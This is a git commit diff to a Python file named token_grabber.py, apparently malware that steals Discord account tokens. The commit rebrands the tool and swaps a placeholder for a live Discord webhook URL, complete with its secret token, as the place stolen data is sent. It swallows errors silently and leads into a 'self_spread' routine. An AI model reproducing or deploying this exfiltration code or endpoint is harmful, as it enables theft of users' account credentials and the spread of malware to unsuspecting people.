ca72ed560aa3dc169d0df0305fd5326906257828
vPrizma <106218580+vPrizma@users.noreply.github.com>
2022-05-25 04:44:13 +0100

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -178,11 +178,11 @@ def main():
     webhook = {
         "content": "",
         "embeds": embeds,
-        "username": "Discord Token Grabber",
+        "username": "Prizma Token Grabber",
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/978860422046298112/yfOShxI38mWzBaT_NhxQ4ekuqd_tDCkzQ-skHIJJwDIlY0ZDGDG75uTRD7dAvPkotv88", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
